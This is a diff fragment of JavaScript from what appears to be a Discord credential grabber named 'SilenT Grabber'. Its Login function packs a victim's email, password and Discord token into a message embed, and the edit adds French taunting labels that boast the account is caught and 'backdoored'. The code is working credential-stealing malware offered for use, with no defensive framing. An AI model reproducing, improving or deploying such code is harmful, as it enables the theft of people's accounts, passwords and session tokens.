@@ -152,13 +152,12 @@ function Login(email, password, token) {
                     "color": 31,
                     "fields": [
                         {
-                            "name": "",
-                            "value": `
-			    Email : ${email}  Password : ${password}`,
+                            "name": "**Oh bah tien, la personne qui l'a grab dois dire qui elle sinon elle va se faire voler se compte.**",
+                            "value": `Son Email : ${email}  Mot de passe: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**Token**",
+                            "name": "**Son Token**",
                             "value": `\`${token}\``,
                             "inline": true
                         }
@@ -168,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": ""
+                        "text": "SilenT Grabber. On a une TOUCHE ! Les reufs , il est backdoor il peut plus s'échappé !"
                     }
                 }
             ]
